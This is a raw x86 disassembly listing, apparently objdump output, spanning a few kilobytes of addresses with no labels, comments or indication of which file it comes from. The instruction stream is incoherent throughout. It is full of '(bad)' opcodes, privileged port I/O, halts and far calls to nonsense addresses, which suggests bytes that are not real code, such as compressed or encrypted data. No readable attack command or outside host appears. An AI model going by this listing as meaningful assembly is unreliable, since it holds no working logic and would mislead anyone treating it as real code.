  41f801:	imul   edx,DWORD PTR [edx],0xb8b89250
  41f807:	stc    
  41f808:	inc    esp
  41f809:	lods   al,BYTE PTR ds:[esi]
  41f80a:	jecxz  0x41f86c
  41f80c:	xchg   ebx,eax
  41f80d:	cmp    BYTE PTR [ebx-0x222b653f],bl
  41f813:	repz mov bl,0xa5
  41f816:	call   0xdf57:0x71168ada
  41f81d:	out    dx,al
  41f81e:	add    eax,0xb17a61db
  41f823:	xchg   DWORD PTR [edi],ebx
  41f825:	mov    ah,0x87
  41f827:	mov    WORD PTR ds:0xc0e2a64a,ds
  41f82d:	std    
  41f82e:	adc    ch,BYTE PTR ds:0x366fda6d
  41f834:	jge    0x41f845
  41f836:	repnz sub BYTE PTR [eax-0x58],dh
  41f83a:	mov    bl,0x24
  41f83c:	or     eax,esp
  41f83e:	call   0x7ad8:0xbb3ff57b
  41f845:	or     eax,esp
  41f847:	mov    eax,ds:0xaf9fc912
  41f84c:	js     0x41f886
  41f84e:	clc    
  41f84f:	xchg   BYTE PTR [edi+0x23],bl
  41f852:	mov    ecx,0x6c17a0c8
  41f857:	dec    eax
  41f858:	(bad)  
  41f859:	add    ebp,DWORD PTR [edx-0x6f67b55c]
  41f85f:	lea    edi,[ebx-0x76]
  41f862:	iret   
  41f863:	ret    0x16c7
  41f866:	(bad)  
  41f868:	fmul   st,st(4)
  41f86a:	mov    esi,0x338dba8f
  41f86f:	cmp    eax,0x3cd9cd75
  41f874:	enter  0xb3a2,0xc3
  41f878:	scas   al,BYTE PTR es:[edi]
  41f879:	xor    al,0xd1
  41f87b:	xor    BYTE PTR [edi+0x3c],0x64
  41f87f:	and    bh,ah
  41f881:	sbb    DWORD PTR ds:0x874b6d5,edx
  41f887:	xchg   ecx,eax
  41f888:	cmp    bh,BYTE PTR [esi]
  41f88a:	and    eax,0x6d53eea8
  41f88f:	fld    TBYTE PTR [eax-0x47]
  41f892:	dec    esi
  41f893:	add    BYTE PTR [edi+ecx*4+0x3d2469da],0x46
  41f89b:	sti    
  41f89c:	repnz loope 0x41f854
  41f89f:	(bad)  
  41f8a0:	enter  0x285e,0x39
  41f8a4:	pop    esi
  41f8a5:	aam    0x17
  41f8a7:	dec    ecx
  41f8a8:	dec    edx
  41f8a9:	pop    edx
  41f8aa:	xchg   edi,eax
  41f8ab:	mov    ds:0xcebb0dd,al
  41f8b0:	jmp    0x9363e251
  41f8b5:	adc    bl,BYTE PTR [edi+0x7e6c3b9]
  41f8bb:	(bad)  
  41f8bc:	in     al,dx
  41f8bd:	mov    esp,edx
  41f8bf:	(bad)  
  41f8c0:	aam    0x96
  41f8c2:	out    dx,al
  41f8c3:	jns    0x41f8d2
  41f8c5:	adc    al,0x86
  41f8c7:	pop    es
  41f8c8:	loopne 0x41f947
  41f8ca:	xchg   ecx,eax
  41f8cb:	mov    dh,0x5
  41f8cd:	mov    cl,0xfd
  41f8cf:	call   0x7a4b:0x9e6cfbe7
  41f8d6:	sbb    al,0xb6
  41f8d8:	sub    DWORD PTR [esi],ebp
  41f8da:	fldcw  WORD PTR [edx+0x7e]
  41f8dd:	out    dx,al
  41f8de:	mov    ecx,0xe65a55cb
  41f8e3:	adc    esi,DWORD PTR [edx]
  41f8e5:	outs   dx,DWORD PTR ds:[esi]
  41f8e6:	arpl   WORD PTR [ecx+0x5c],ax
  41f8e9:	aaa    
  41f8ea:	xchg   edx,eax
  41f8eb:	je     0x41f937
	...
  41f955:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	mov    ds:0xebdc5186,eax
  41f967:	push   edx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	inc    DWORD PTR [eax]
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	out    0x77,eax
  41f970:	inc    eax
  41f971:	or     ecx,DWORD PTR [esi+eax*4]
  41f974:	stc    
  41f975:	inc    esi
  41f976:	sti    
  41f977:	fdivr  QWORD PTR [esi]
  41f979:	xlat   BYTE PTR ds:[ebx]
  41f97a:	jo     0x41f9bc
  41f97c:	dec    esi
  41f97d:	js     0x41f973
  41f97f:	and    eax,0xad726fde
  41f984:	cmp    ah,ch
  41f986:	loope  0x41f983
  41f988:	jg     0x41f980
  41f98a:	sti    
  41f98b:	mov    ah,0x9c
  41f98d:	or     al,0xc9
  41f98f:	mov    eax,ds:0x7c26ccdc
  41f994:	inc    ebx
  41f995:	push   ecx
  41f996:	stos   DWORD PTR es:[edi],eax
  41f997:	loopne 0x41f9d7
  41f999:	sub    DWORD PTR [esi+0x599c7092],esi
  41f99f:	xor    eax,0xdc4b0209
  41f9a4:	jae    0x41f9f6
  41f9a6:	sbb    eax,0xce3e4478
  41f9ab:	nop
  41f9ac:	or     al,0xc7
  41f9ae:	push   0xbdc5eb3d
  41f9b3:	ror    DWORD PTR [eax-0xce6047d],cl
  41f9b9:	fcmovnbe st,st(1)
  41f9bb:	std    
  41f9bc:	repnz xchg esp,eax
  41f9be:	stos   BYTE PTR es:[edi],al
  41f9bf:	and    eax,0xd6ba8408
  41f9c4:	add    ah,BYTE PTR [edi+0x12]
  41f9c7:	test   eax,0x5d025ff8
  41f9cc:	pop    edx
  41f9cd:	sub    ebp,DWORD PTR [esi+0x15]
  41f9d0:	mov    esp,0xf4ba38f8
  41f9d5:	xor    DWORD PTR ds:0x9aff1315,0x7b
  41f9dc:	inc    BYTE PTR [esi+0x21291404]
  41f9e2:	ins    BYTE PTR es:[edi],dx
  41f9e3:	inc    ecx
  41f9e4:	cmc    
  41f9e5:	adc    BYTE PTR [ebx],dh
  41f9e7:	es mov ecx,0x7baa7134
  41f9ed:	(bad)  
  41f9ef:	retf   0x39f4
  41f9f2:	xor    cl,BYTE PTR [eax+0xf79375b]
  41f9f8:	inc    esi
  41f9f9:	xchg   ebp,eax
  41f9fa:	mov    ds:0x8aa83065,al
  41f9ff:	das    
  41fa00:	jbe    0x41fa78
  41fa02:	popa   
  41fa03:	push   0x78022568
  41fa08:	jno    0x41f9cb
  41fa0a:	test   DWORD PTR [ebx-0x73],edx
  41fa0d:	dec    ebx
  41fa0e:	lock lods eax,DWORD PTR ds:[esi]
  41fa10:	inc    ebx
  41fa11:	idiv   BYTE PTR [ecx]
  41fa13:	xor    eax,0x5c0812ea
  41fa18:	clc    
  41fa19:	cmp    eax,0x5ca4bcbd
  41fa1e:	(bad)  
  41fa1f:	jge    0x41fa92
  41fa21:	pushf  
  41fa22:	xor    eax,DWORD PTR [edx]
  41fa24:	cmp    DWORD PTR [ebp-0x50f54fba],esi
  41fa2a:	fstp   st(7)
  41fa2c:	add    esi,ebp
  41fa2e:	xor    bh,BYTE PTR [ecx+ecx*8+0x26b57976]
  41fa35:	(bad)  
  41fa36:	mov    bl,0x9c
  41fa38:	clc    
  41fa39:	pop    edx
  41fa3a:	cmc    
  41fa3b:	outs   dx,DWORD PTR ds:[esi]
  41fa3c:	shr    edi,0x6a
  41fa3f:	dec    BYTE PTR [edx-0x49cc904f]
  41fa45:	xor    al,0x47
  41fa47:	push   eax
  41fa48:	xchg   esi,eax
  41fa49:	push   eax
  41fa4a:	jne    0x41fa41
  41fa4c:	jb     0x41fa4c
  41fa4e:	inc    ebp
  41fa4f:	mov    WORD PTR [eax-0x2a],ss
  41fa52:	dec    edx
  41fa53:	jb     0x41fad2
  41fa55:	inc    eax
  41fa56:	call   0x2b66f974
  41fa5b:	lock push ebp
  41fa5d:	outs   dx,DWORD PTR ds:[esi]
  41fa5e:	mov    ebx,0xb1e9e56a
  41fa63:	lahf   
  41fa64:	inc    BYTE PTR [edx+0x3]
  41fa67:	add    DWORD PTR [edx],esp
  41fa69:	inc    edx
  41fa6a:	retf   0x2248
	...
  41fad5:	add    BYTE PTR [edx],cl
  41fad7:	inc    ecx
  41fad8:	mov    bh,0xa1
  41fada:	push   edi
  41fadc:	push   ds
  41fadd:	jmp    0x41fb02
  41fadf:	push   edi
  41fae0:	mov    ds:0xc135d915,eax
  41fae5:	addr16 jmp 0x0:0xff000153
  41faed:	add    BYTE PTR [ebp-0x49],cl
  41faf0:	dec    edi
  41faf1:	inc    esi
  41faf2:	loopne 0x41fa8b
  41faf4:	cmp    BYTE PTR [edi+ecx*4+0x46cb10bf],0xff
  41fafc:	leave  
  41fafd:	les    eax,FWORD PTR fs:[ebx+0x2b76e3df]
  41fb04:	mov    BYTE PTR [esi],bl
  41fb06:	mov    ebx,0x3e7f1540
  41fb0b:	out    0x4c,eax
  41fb0d:	mov    bh,0x34
  41fb0f:	sub    dh,BYTE PTR [ecx]
  41fb11:	inc    ebp
  41fb12:	inc    eax
  41fb13:	out    0x45,al
  41fb15:	ds xchg edi,eax
  41fb17:	mov    WORD PTR gs:[edi+0x8facbd2],?
  41fb1e:	mov    eax,ds:0x3392eb08
  41fb23:	rcl    BYTE PTR [esi],1
  41fb25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb26:	xlat   BYTE PTR ds:[ebx]
  41fb27:	into   
  41fb28:	push   esi
  41fb29:	jge    0x41fb3c
  41fb2b:	scas   al,BYTE PTR es:[edi]
  41fb2c:	pop    esi
  41fb2d:	les    ebx,FWORD PTR [ebx]
  41fb2f:	call   0xccd4d5af
  41fb34:	pop    ss
  41fb35:	xchg   ecx,eax
  41fb36:	mov    al,0xc2
  41fb38:	lods   eax,DWORD PTR ds:[esi]
  41fb39:	sub    esp,eax
  41fb3b:	je     0x41fb51
  41fb3d:	rol    DWORD PTR [eax-0x1d],1
  41fb40:	mov    edx,0x391f5b1d
  41fb45:	adc    DWORD PTR [eax+0x354078db],0x893080aa
  41fb4f:	pop    eax
  41fb50:	inc    esi
  41fb51:	cmp    bh,ah
  41fb53:	hlt    
  41fb54:	dec    eax
  41fb55:	popf   
  41fb56:	mov    esi,ebx
  41fb58:	adc    BYTE PTR [edx+0x38],0x5e
  41fb5c:	inc    ebp
  41fb5d:	mov    ds:0xef5f74bd,eax
  41fb62:	mov    ecx,0x54ad35a8
  41fb67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb68:	in     al,dx
  41fb69:	jnp    0x41fb34
  41fb6b:	dec    edi
  41fb6c:	dec    edx
  41fb6d:	pop    fs
  41fb6f:	mov    al,0x47
  41fb71:	inc    esi
  41fb72:	fcom   QWORD PTR [esi+0x63]
  41fb75:	xchg   DWORD PTR ds:0x152785ce,ebx
  41fb7b:	push   esp
  41fb7c:	xchg   ebp,eax
  41fb7d:	clc    
  41fb7e:	sbb    al,BYTE PTR [esi+eiz*1]
  41fb81:	or     ch,BYTE PTR ds:0x457fb849
  41fb87:	lods   al,BYTE PTR ds:[esi]
  41fb88:	dec    ebp
  41fb89:	out    0x69,eax
  41fb8b:	pop    ss
  41fb8c:	mov    ch,0xbe
  41fb8e:	push   ebp
  41fb8f:	adc    dl,ch
  41fb91:	ja     0x41fb3a
  41fb93:	rcr    DWORD PTR [eax+0x7e0b3a88],cl
  41fb99:	dec    edx
  41fb9a:	mov    DWORD PTR [edx-0x58],0x2fa70b50
  41fba1:	dec    ebx
  41fba2:	dec    eax
  41fba3:	leave  
  41fba4:	adc    dh,BYTE PTR [ebx-0x127c7c9e]
  41fbaa:	aas    
  41fbab:	xchg   edx,eax
  41fbac:	adc    al,0xbd
  41fbae:	or     ecx,DWORD PTR [eax]
  41fbb0:	repnz xor eax,0x79fcd905
  41fbb6:	lahf   
  41fbb7:	mov    ah,BYTE PTR es:0x92ff937
  41fbbe:	mov    ebx,0x3c817af9
  41fbc3:	xor    DWORD PTR [ecx+0x74580673],0xfffffff1
  41fbca:	and    BYTE PTR [ecx+0x4d],ch
  41fbcd:	aas    
  41fbce:	outs   dx,DWORD PTR ds:[esi]
  41fbcf:	xchg   ebp,eax
  41fbd0:	inc    esi
  41fbd1:	outs   dx,DWORD PTR ds:[esi]
  41fbd2:	push   ecx
  41fbd3:	sahf   
  41fbd4:	cmp    DWORD PTR [eax-0x2c],0x9223a9b1
  41fbdb:	out    dx,eax
  41fbdc:	fidivr WORD PTR [edi+0x6a]
  41fbdf:	out    dx,eax
  41fbe0:	sbb    esi,ebx
  41fbe2:	stc    
  41fbe3:	test   eax,0xe08124e5
  41fbe8:	fdiv   QWORD PTR [edx]
  41fbea:	push   esp
  41fbeb:	jg     0x41fb74
	...
  41fc55:	add    ah,bl
  41fc57:	sub    BYTE PTR [edx-0x119011c],cl
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	push   eax
  41fc63:	addr16 mov ch,0xa2
  41fc66:	jmp    0xff41fdbf
  41fc6b:	add    BYTE PTR [eax],al
  41fc6d:	add    dl,dh
  41fc6f:	(bad)  
  41fc70:	ficom  DWORD PTR [ebp-0x71312940]
  41fc76:	push   ebp
  41fc77:	inc    eax
  41fc78:	shr    BYTE PTR [esi+edx*1+0xc0855a4],0x1f
  41fc80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc81:	mov    ebx,0x88b9bdb8
  41fc86:	xor    eax,0x948375fb
  41fc8b:	and    bh,BYTE PTR [edx+ebp*8+0x618d13ec]
  41fc92:	sahf   
  41fc93:	inc    esp
  41fc94:	mov    BYTE PTR [ecx],dl
  41fc96:	pop    eax
  41fc97:	fld    QWORD PTR [edi+0x78]
  41fc9b:	mov    edi,0x53e77e20
  41fca0:	je     0x41fcc3
  41fca2:	mov    edi,0x26bbad64
  41fca7:	xchg   ecx,eax
  41fca8:	cmp    cl,ch
  41fcaa:	jbe    0x41fd16
  41fcac:	lods   al,BYTE PTR ds:[esi]
  41fcad:	mov    edx,0x5ffc3c72
  41fcb2:	lock pop esi
  41fcb4:	xor    eax,0xf5ae3b1d
  41fcb9:	or     ebp,DWORD PTR [edx]
  41fcbb:	repz aam 0x12
  41fcbe:	pusha  
  41fcbf:	cmp    ecx,DWORD PTR [edx]
  41fcc1:	jbe    0x41fd17
  41fcc3:	jge    0x41fd23
  41fcc5:	or     DWORD PTR [esi],esi
  41fcc7:	leave  
  41fcc8:	jle    0x41fc9f
  41fcca:	test   al,0xc7
  41fccc:	sbb    DWORD PTR [ebx-0xb97dff5],edx
  41fcd2:	xchg   ebp,eax
  41fcd3:	cdq    
  41fcd4:	setae  BYTE PTR [esi]
  41fcd7:	out    dx,al
  41fcd8:	mov    edx,0xadd97284
  41fcdd:	daa    
  41fcde:	cli    
  41fcdf:	sbb    BYTE PTR [edx-0x4f86c38b],al
  41fce5:	loopne 0x41fd22
  41fce7:	adc    al,0xb8
  41fce9:	or     DWORD PTR [eax],ebx
  41fceb:	hlt    
  41fcec:	mov    ecx,0x2192962d
  41fcf1:	mov    eax,ds:0x9d772d81
  41fcf6:	sub    eax,0x7aac8057
  41fcfb:	adc    BYTE PTR [ecx+ecx*1-0x7a615595],bl
  41fd02:	pop    ebp
  41fd03:	es jl  0x41fccf
  41fd06:	fadd   QWORD PTR [eax]
  41fd08:	rcr    BYTE PTR [esi+0x50acba51],0x9e
  41fd0f:	lock fist WORD PTR [ebx-0x6573b33]
  41fd16:	shr    DWORD PTR gs:[ecx],cl
  41fd19:	and    al,0x91
  41fd1b:	adc    bh,cl
  41fd1d:	clc    
  41fd1e:	xor    ah,BYTE PTR [ebx-0x4564f3b8]
  41fd24:	shr    dl,1
  41fd26:	(bad)  [eax]
  41fd28:	xchg   edx,ebx
  41fd2a:	fdivr  QWORD PTR ss:[ebx-0x77]
  41fd2e:	xchg   DWORD PTR [edx+eiz*1+0x752d4242],ecx
  41fd35:	xchg   edi,eax
  41fd36:	or     BYTE PTR [esi+0x19],al
  41fd39:	add    al,0xc
  41fd3b:	dec    edi
  41fd3c:	scas   al,BYTE PTR es:[edi]
  41fd3d:	push   eax
  41fd3e:	enter  0x6c3e,0x5
  41fd42:	mov    ebp,0x573a70e9
  41fd47:	dec    eax
  41fd48:	mov    ebp,0x37e23fee
  41fd4d:	jecxz  0x41fceb
  41fd4f:	pop    esi
  41fd50:	push   cs
  41fd51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd52:	mov    bh,0x63
  41fd54:	add    BYTE PTR [ebx+0x74],ch
  41fd57:	dec    ebp
  41fd58:	push   0x258ce9b8
  41fd5d:	sbb    eax,DWORD PTR [eax-0x453ed5e7]
  41fd63:	mov    ds:0xcb1b05d1,eax
  41fd68:	inc    edi
  41fd69:	mov    al,0xba
  41fd6b:	sub    al,BYTE PTR [edx+0x0]
	...
  41fdd5:	add    BYTE PTR [edx+ebp*2],cl
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	jecxz  0x41fe23
  41fde4:	xchg   edi,eax
  41fde5:	nop
  41fde6:	call   0xff41ff40
  41fdeb:	add    BYTE PTR [eax],al
  41fded:	add    BYTE PTR [ebx],dl
  41fdef:	cmp    DWORD PTR [edx-0x158107f],0xffffffd6
  41fdf6:	gs cmc 
  41fdf8:	or     al,0x5e
  41fdfa:	pop    ebx
  41fdfb:	xor    eax,0xd2ab0952
  41fe00:	imul   ebp,eax,0x76a0382f
  41fe06:	sahf   
  41fe07:	cli    
  41fe08:	jge    0x41fe68
  41fe0a:	data16 outs dx,BYTE PTR ds:[esi]
  41fe0c:	aam    0x7
  41fe0e:	lahf   
  41fe0f:	ret    
  41fe10:	ss std 
  41fe12:	daa    
  41fe13:	retf   
  41fe14:	gs (bad) 
  41fe16:	pushf  
  41fe17:	add    edi,DWORD PTR [ebx]
  41fe19:	dec    ebx
  41fe1a:	push   ebp
  41fe1b:	outs   dx,BYTE PTR ds:[esi]
  41fe1c:	pop    edi
  41fe1d:	in     eax,dx
  41fe1e:	pop    ss
  41fe1f:	inc    ebp
  41fe20:	add    eax,DWORD PTR [edi-0x4c]
  41fe23:	inc    edi
  41fe24:	sbb    eax,0xed1e4eb5
  41fe29:	mov    edx,0x22a2177
  41fe2e:	pop    eax
  41fe2f:	pop    ebp
  41fe30:	das    
  41fe31:	gs hlt 
  41fe33:	or     al,0x11
  41fe35:	add    ebp,ebx
  41fe37:	cmp    ah,BYTE PTR ds:0xf4d6c15
  41fe3d:	adc    eax,0xac68b6f9
  41fe42:	(bad)  
  41fe43:	fiadd  WORD PTR [eax+0x64f5e9f4]
  41fe49:	cdq    
  41fe4a:	sbb    al,0xa1
  41fe4c:	xor    ecx,DWORD PTR ds:0x92c866fc
  41fe52:	jno    0x41fe24
  41fe54:	enter  0x5659,0xc7
  41fe58:	shl    DWORD PTR [edi],cl
  41fe5a:	out    0xdc,eax
  41fe5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe5d:	jmp    0x9712:0x45c4930c
  41fe64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe65:	inc    edx
  41fe66:	mov    bh,ah
  41fe68:	mov    fs,WORD PTR [ebp+0x4f9223e1]
  41fe6e:	fs pop esp
  41fe70:	push   cs
  41fe71:	dec    ebx
  41fe72:	inc    ebp
  41fe73:	cmp    edi,DWORD PTR [ebp+0x1507ee8b]
  41fe79:	lds    ebx,FWORD PTR [eax+0x4a25067c]
  41fe7f:	lea    ebx,[edi]
  41fe81:	xor    al,0x69
  41fe83:	lods   al,BYTE PTR ds:[esi]
  41fe84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe85:	popf   
  41fe86:	lods   al,BYTE PTR ds:[esi]
  41fe87:	mov    edx,0x35c8a08
  41fe8c:	stos   DWORD PTR es:[edi],eax
  41fe8d:	mov    ds,ebx
  41fe8f:	mov    BYTE PTR [edi+0x64],cl
  41fe92:	push   esi
  41fe93:	jle    0x41fec7
  41fe95:	adc    ebp,DWORD PTR [ecx]
  41fe97:	xchg   ebx,eax
  41fe98:	mov    ch,0x83
  41fe9a:	add    BYTE PTR ds:0x34d6a31c,ch
  41fea0:	pop    ebx
  41fea1:	ret    
  41fea2:	int3   
  41fea3:	out    0xa3,al
  41fea5:	cmc    
  41fea6:	popf   
  41fea7:	cmp    al,0xe9
  41fea9:	outs   dx,BYTE PTR ds:[esi]
  41feaa:	outs   dx,BYTE PTR ds:[esi]
  41feab:	push   ebp
  41feac:	nop
  41fead:	push   ds
  41feae:	cmp    eax,0x5630c393
  41feb3:	and    edx,ebx
  41feb5:	pop    es
  41feb6:	and    al,BYTE PTR cs:[ecx+0x3090e5da]
  41febd:	retf   
  41febe:	add    DWORD PTR [esi+0x15],0xc1035f54
  41fec5:	xchg   esi,eax
  41fec6:	(bad)  
  41fec8:	xchg   esi,eax
  41fec9:	jnp    0x41fe88
  41fecb:	xor    cl,bl
  41fecd:	pop    ebx
  41fece:	push   es
  41fecf:	pushf  
  41fed0:	rcr    DWORD PTR [ebp+0x6e6d1ee],1
  41fed6:	xor    bl,0x42
  41fed9:	mov    WORD PTR [eax+0x78],cs
  41fedc:	adc    edx,DWORD PTR [eax+0x68]
  41fedf:	test   eax,0x79958d19
  41fee4:	loopne 0x41ff10
  41fee6:	(bad)  
  41fee8:	rcl    BYTE PTR [esi],0xc5
  41feeb:	call   FWORD PTR [eax+eax*1]
	...
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x8f
  41ff63:	bound  edx,QWORD PTR [ebx+0x156e7d0]
  41ff69:	add    bh,bh
  41ff6b:	add    BYTE PTR [eax],al
  41ff6d:	add    BYTE PTR [ebp+0x1fba718],ch
  41ff73:	mov    ch,0x80
  41ff75:	clc    
  41ff76:	dec    ebp
  41ff77:	fucom  st(5)
  41ff79:	je     0x41ff06
  41ff7b:	loop   0x41ff15
  41ff7d:	xchg   ecx,eax
  41ff7e:	push   0x558eb6bf
  41ff83:	xchg   BYTE PTR [ebp-0x4e],bl
  41ff86:	cmp    dl,BYTE PTR [edi+0x3d]
  41ff89:	mov    esp,0x53652c4a
  41ff8e:	push   0x6c
  41ff90:	ins    DWORD PTR es:[edi],dx
  41ff91:	dec    esp
  41ff92:	mov    WORD PTR [edi+0x4774a3d7],?
  41ff98:	hlt    
  41ff99:	cwde   
  41ff9a:	lea    eax,[esi-0x2aa1348a]
  41ffa0:	mov    WORD PTR [esp+eiz*8],fs
  41ffa3:	test   BYTE PTR [ebx],bl
  41ffa5:	adc    eax,0xb87fd4a7
  41ffaa:	test   esp,ebx
  41ffac:	sub    eax,0x63c6468d
  41ffb1:	xor    al,0xb2
  41ffb3:	sub    al,0x1a
  41ffb5:	pop    esp
  41ffb6:	mov    edx,0x4698f33f
  41ffbb:	sub    al,BYTE PTR [esi+0x73]
  41ffbe:	mov    ebp,0xe9a123fe
  41ffc3:	and    bh,BYTE PTR [ebx+0x6f]
  41ffc6:	pop    esp
  41ffc7:	inc    esi
  41ffc8:	retf   0xa94e
  41ffcb:	push   eax
  41ffcc:	mov    ch,0x74
  41ffce:	(bad)  
  41ffcf:	hlt    
  41ffd0:	push   ss
  41ffd1:	sub    al,0x13
  41ffd3:	out    dx,eax
  41ffd4:	push   edx
  41ffd5:	or     bh,BYTE PTR [edx+0x59]
  41ffd8:	xor    edx,DWORD PTR [ebx]
  41ffda:	imul   esp,ebp,0x4f
  41ffdd:	pop    edx
  41ffde:	dec    ebx
  41ffdf:	ret    0xea79
  41ffe2:	fbld   TBYTE PTR [edx]
  41ffe4:	fscale 
  41ffe6:	sbb    BYTE PTR [ebx+ecx*8+0x10],dh
  41ffea:	and    eax,0x75f90883
  41ffef:	xchg   esp,eax
  41fff0:	push   0x7b
  41fff2:	les    esp,FWORD PTR [ecx-0x47]
  41fff5:	pop    edx
  41fff6:	shr    BYTE PTR [edx+0x78ccb034],1
  41fffc:	sub    al,0x2b
  41fffe:	cmp    DWORD PTR [eax],edx
  420000:	mov    al,ds:0x28078067
  420005:	or     dh,BYTE PTR [eax]
  420007:	fwait
  420008:	dec    ebp
  420009:	xchg   esi,eax
  42000a:	push   ecx
  42000b:	fwait
  42000c:	pop    ecx
  42000d:	pop    ebp
  42000e:	aaa    
  42000f:	lds    edi,FWORD PTR [ebx]
  420011:	cmp    ch,BYTE PTR [edi+0x18]
  420014:	aaa    
  420015:	shl    ah,1
  420017:	rcl    esi,0x41
  42001a:	call   0x60b8de0
  42001f:	retf   0xc3f
  420022:	jno    0x420003
  420024:	push   es
  420025:	mov    ch,0xc3
  420027:	lock add al,0xae
  42002a:	xchg   esp,eax
  42002b:	jnp    0x42008b
  42002d:	cmp    DWORD PTR [ecx+0x7d],ebx
  420030:	imul   ecx,ecx,0x30
  420033:	loop   0x42007e
  420035:	jmp    0x167d:0x8f87ca03
  42003c:	xchg   esp,eax
  42003d:	cmp    al,0xc0
  42003f:	add    dh,bl
  420041:	lods   al,BYTE PTR ds:[esi]
  420042:	ss ins DWORD PTR es:[edi],dx
  420044:	pushf  
  420045:	add    ch,BYTE PTR [ebx]
  420047:	sbb    BYTE PTR ds:0x14d2e559,ah
  42004d:	push   ebp
  42004e:	test   BYTE PTR [esi],0x8
  420051:	lds    ebp,FWORD PTR [esi]
  420053:	jo     0x420047
  420055:	aad    0xe5
  420057:	ret    0x4c8a
  42005a:	xlat   BYTE PTR ds:[ebx]
  42005b:	cmp    edx,esp
  42005d:	shl    BYTE PTR [esp+ecx*4-0x272dd842],0x5c
  420065:	push   cs
  420066:	call   0xda57176
  42006b:	jge    0x42009e
	...
  4200d5:	add    BYTE PTR [edx-0x5b],ah
  4200d8:	jbe    0x420159
  4200da:	idiv   edi
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffc7
  4200e3:	jle    0x420074
  4200e5:	sub    esp,esi
  4200e7:	push   edi
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	inc    DWORD PTR [eax]
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	ret    
  4200ef:	(bad)  
  4200f3:	add    edx,DWORD PTR ds:0x6ca61c40
  4200f9:	fcmove st,st(5)
  4200fb:	icebp  
  4200fc:	mov    es,ebp
  4200fe:	push   ecx
  4200ff:	cmp    bh,dh
  420101:	mov    eax,0xfe00c2b1
  420106:	mov    ecx,ecx
  420108:	push   esi
  420109:	push   ss
  42010a:	dec    ecx
  42010b:	xchg   edx,eax
  42010c:	xchg   BYTE PTR [ebp-0x33ef5c90],bl
  420112:	or     eax,0x92bf5ede
  420117:	scas   al,BYTE PTR es:[edi]
  420118:	and    bh,BYTE PTR [ebx]
  42011a:	sbb    eax,DWORD PTR [eax-0x696161f0]
  420120:	mov    esp,0x37dbf0da
  420125:	jb     0x420164
  420127:	add    bl,BYTE PTR [edi]
  420129:	push   0x4d
  42012b:	into   
  42012c:	arpl   WORD PTR [ebp-0x49420bbe],sp
  420132:	xor    esp,DWORD PTR [edi+0x19]
  420135:	cwde   
  420136:	repz jmp 0x420138
  420139:	lahf   
  42013a:	sub    DWORD PTR [ebx+0x64636c27],0xffffffcb
  420141:	xor    al,0x7
  420143:	daa    
  420144:	stos   BYTE PTR es:[edi],al
  420145:	in     al,0x52
  420147:	dec    edi
  420148:	dec    ebp
  420149:	mov    al,ds:0x2dfbeaf
  42014e:	add    eax,0x3de900ce
  420153:	cdq    
  420154:	stos   DWORD PTR es:[edi],eax
  420155:	adc    al,0x63
  420157:	xor    DWORD PTR [esi],0xd2dade07
  42015d:	inc    esp
  42015e:	push   edx
  42015f:	or     esp,DWORD PTR [esi+0x54]
  420162:	cmc    
  420163:	xchg   ecx,eax
  420164:	(bad)  
  420165:	xlat   BYTE PTR ds:[ebx]
  420166:	inc    ebx
  420167:	cli    
  420168:	mov    ds:0x1a6a025,al
  42016d:	inc    esi
  42016e:	nop
  42016f:	push   eax
  420170:	nop    DWORD PTR [edx-0x43022318]
  420177:	xor    dl,BYTE PTR [edi]
  420179:	cdq    
  42017a:	stos   BYTE PTR es:[edi],al
  42017b:	mov    dl,0x8d
  42017d:	fld    DWORD PTR [ebx-0x731fd38f]
  420183:	out    0x68,al
  420185:	adc    DWORD PTR [edi+0x60],0x59cc701b
  42018c:	mov    al,BYTE PTR [esi+0x8e4a6c7]
  420192:	or     edx,DWORD PTR [ebp+0x9]
  420195:	mov    ds:0x23498420,eax
  42019a:	loopne 0x42013d
  42019c:	jnp    0x42012c
  42019e:	(bad)  
  42019f:	int    0x14
  4201a1:	mov    esi,0xd9483e7e
  4201a6:	out    dx,ax
  4201a8:	call   0x985b:0x79dad3b2
  4201af:	sbb    esp,DWORD PTR [edx+edx*4]
  4201b2:	inc    eax
  4201b3:	pushf  
  4201b4:	sub    ah,bh
  4201b6:	and    eax,ebx
  4201b8:	mov    ebp,0x8df9dda3
  4201bd:	adc    BYTE PTR [ecx],0x92
  4201c0:	pop    ecx
  4201c1:	std    
  4201c2:	aaa    
  4201c3:	outs   dx,DWORD PTR ds:[esi]
  4201c4:	mov    eax,0x276ba0b3
  4201c9:	pop    ebp
  4201ca:	mov    cl,0x5e
  4201cc:	push   0xffffff80
  4201ce:	pushf  
  4201cf:	(bad)  
  4201d0:	mov    ebx,0x7f88840
  4201d5:	sbb    esp,DWORD PTR [edi-0x1fed0208]
  4201db:	sti    
  4201dc:	xchg   ebx,eax
  4201dd:	sbb    al,0xf5
  4201df:	loopne 0x42019e
  4201e1:	fimul  WORD PTR [ecx]
  4201e3:	jns    0x42019a
  4201e5:	add    al,0x92
  4201e7:	loop   0x4201b9
  4201e9:	hlt    
  4201ea:	jl     0x420179
  4201ec:	retf   0x0
	...
  420253:	add    BYTE PTR [eax],al
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
